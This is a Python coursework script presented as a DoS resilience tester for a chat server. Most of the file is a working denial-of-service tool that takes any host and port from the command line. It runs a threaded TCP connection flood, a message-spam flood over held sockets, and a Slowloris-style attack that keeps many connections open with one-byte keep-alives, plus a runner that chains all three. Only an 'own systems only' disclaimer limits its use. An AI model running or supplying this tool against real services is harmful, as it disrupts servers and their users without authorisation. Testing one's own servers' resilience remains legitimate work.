"""
DoS Attack Testing Script for Secure Chat Application
Educational Purpose: Testing server resilience and connection handling
Author: Programming & Algorithm 2 - Coursework

IMPORTANT: This script is for educational testing purposes only.
Use only on your own systems and networks for coursework validation.
"""

import socket
import threading
import time
import random
import sys
from datetime import datetime


class DoSTester:
    """
    Simple DoS testing tool for evaluating server resilience
    Tests multiple attack vectors against the chat server
    """
    
    def __init__(self, target_host='localhost', target_port=12345):
        self.target_host = target_host
        self.target_port = target_port
        self.active_threads = []
        self.attack_active = False
        self.connection_count = 0
        self.successful_connections = 0
        self.failed_connections = 0
        
    def log_attack(self, message):
        """Log attack progress with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] DoS Test: {message}")
    
    def connection_flood_attack(self, duration=30, connections_per_second=10):
        """
        Connection Flooding Attack
        Opens many connections rapidly to exhaust server resources
        """
        self.log_attack(f"Starting Connection Flood Attack")
        self.log_attack(f"Target: {self.target_host}:{self.target_port}")
        self.log_attack(f"Duration: {duration}s, Rate: {connections_per_second}/s")
        
        self.attack_active = True
        start_time = time.time()
        
        while time.time() - start_time < duration and self.attack_active:
            for _ in range(connections_per_second):
                if not self.attack_active:
                    break
                thread = threading.Thread(target=self._create_connection)
                thread.daemon = True
                thread.start()
                self.active_threads.append(thread)
            
            time.sleep(1)  # Wait 1 second before next batch
            
            # Clean up finished threads
            self.active_threads = [t for t in self.active_threads if t.is_alive()]
            
            # Progress report
            if int(time.time() - start_time) % 5 == 0:
                self.log_attack(f"Active threads: {len(self.active_threads)}, "
                              f"Success: {self.successful_connections}, "
                              f"Failed: {self.failed_connections}")
        
        self.attack_active = False
        self.log_attack("Connection Flood Attack completed")
    
    def _create_connection(self):
        """Create a single connection to the target server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5 second timeout
            sock.connect((self.target_host, self.target_port))
            
            self.successful_connections += 1
            self.connection_count += 1
            
            # Hold connection open for random time
            time.sleep(random.uniform(1, 10))
            sock.close()
            
        except Exception as e:
            self.failed_connections += 1
            # Don't print individual errors to avoid spam
    
    def message_spam_attack(self, duration=20, messages_per_second=50):
        """
        Message Spam Attack
        Sends rapid messages through established connections
        """
        self.log_attack(f"Starting Message Spam Attack")
        self.log_attack(f"Duration: {duration}s, Rate: {messages_per_second}/s")
        
        # Establish a few connections for message spam
        connections = []
        for i in range(5):  # Use 5 connections for spam
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_host, self.target_port))
                connections.append(sock)
                self.log_attack(f"Established spam connection {i+1}/5")
            except:
                self.log_attack(f"Failed to establish spam connection {i+1}")
        
        if not connections:
            self.log_attack("No connections available for message spam")
            return
        
        self.attack_active = True
        start_time = time.time()
        message_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            for sock in connections[:]:  # Copy list to allow modification
                try:
                    # Send spam message
                    spam_message = f"SPAM_MESSAGE_{message_count}_{random.randint(1000,9999)}"
                    sock.send(spam_message.encode())
                    message_count += 1
                    
                    time.sleep(1.0 / messages_per_second)  # Control rate
                    
                except:
                    # Remove failed connection
                    connections.remove(sock)
                    if not connections:
                        self.log_attack("All spam connections failed")
                        break
            
            if not connections:
                break
        
        # Clean up connections
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        self.attack_active = False
        self.log_attack(f"Message Spam Attack completed. Sent {message_count} messages")
    
    def slowloris_attack(self, duration=30, connection_count=50):
        """
        Slowloris Attack
        Keeps many connections open with slow, incomplete requests
        """
        self.log_attack(f"Starting Slowloris Attack")
        self.log_attack(f"Duration: {duration}s, Connections: {connection_count}")
        
        connections = []
        
        # Establish connections
        for i in range(connection_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_host, self.target_port))
                connections.append(sock)
                
                if (i + 1) % 10 == 0:
                    self.log_attack(f"Established {i+1}/{connection_count} slow connections")
            except:
                pass
        
        self.log_attack(f"Established {len(connections)} slow connections")
        
        self.attack_active = True
        start_time = time.time()
        
        # Keep connections alive with minimal traffic
        while time.time() - start_time < duration and self.attack_active:
            for sock in connections[:]:
                try:
                    # Send minimal keep-alive data
                    sock.send(b".")
                    time.sleep(0.1)
                except:
                    connections.remove(sock)
            
            time.sleep(5)  # Wait before next keep-alive round
            
            if len(connections) == 0:
                self.log_attack("All slow connections lost")
                break
        
        # Clean up
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        self.attack_active = False
        self.log_attack("Slowloris Attack completed")
    
    def stop_attack(self):
        """Stop all active attacks"""
        self.attack_active = False
        self.log_attack("Stopping all attacks...")
    
    def run_comprehensive_test(self):
        """Run all DoS tests in sequence"""
        self.log_attack("=" * 60)
        self.log_attack("STARTING COMPREHENSIVE DoS TESTING")
        self.log_attack("=" * 60)
        
        try:
            # Test 1: Connection Flood
            self.log_attack("\n--- TEST 1: Connection Flood Attack ---")
            self.connection_flood_attack(duration=20, connections_per_second=15)
            time.sleep(5)  # Cool down
            
            # Test 2: Message Spam
            self.log_attack("\n--- TEST 2: Message Spam Attack ---")
            self.message_spam_attack(duration=15, messages_per_second=30)
            time.sleep(5)  # Cool down
            
            # Test 3: Slowloris
            self.log_attack("\n--- TEST 3: Slowloris Attack ---")
            self.slowloris_attack(duration=20, connection_count=30)
            
        except KeyboardInterrupt:
            self.log_attack("Testing interrupted by user")
            self.stop_attack()
        
        # Final report
        self.log_attack("\n" + "=" * 60)
        self.log_attack("DoS TESTING COMPLETE")
        self.log_attack(f"Total successful connections: {self.successful_connections}")
        self.log_attack(f"Total failed connections: {self.failed_connections}")
        self.log_attack("=" * 60)


def main():
    """Main function with command line options"""
    print("DoS Testing Tool for Secure Chat Application")
    print("Educational Purpose - Use only on your own systems")
    print("-" * 50)
    
    if len(sys.argv) < 3:
        print("Usage: python dos_tester.py <host> <port> [test_type]")
        print("Test types: flood, spam, slowloris, comprehensive")
        print("Example: python dos_tester.py localhost 12345 comprehensive")
        return
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    test_type = sys.argv[3] if len(sys.argv) > 3 else "comprehensive"
    
    # Verify target is reachable
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(3)
        test_sock.connect((host, port))
        test_sock.close()
        print(f"✓ Target {host}:{port} is reachable")
    except:
        print(f"✗ Cannot connect to {host}:{port}")
        print("Make sure your chat server is running!")
        return
    
    tester = DoSTester(host, port)
    
    try:
        if test_type == "flood":
            tester.connection_flood_attack(duration=30, connections_per_second=20)
        elif test_type == "spam":
            tester.message_spam_attack(duration=25, messages_per_second=40)
        elif test_type == "slowloris":
            tester.slowloris_attack(duration=30, connection_count=40)
        elif test_type == "comprehensive":
            tester.run_comprehensive_test()
        else:
            print(f"Unknown test type: {test_type}")
            
    except KeyboardInterrupt:
        print("\nStopping DoS testing...")
        tester.stop_attack()


if __name__ == "__main__":
    main()
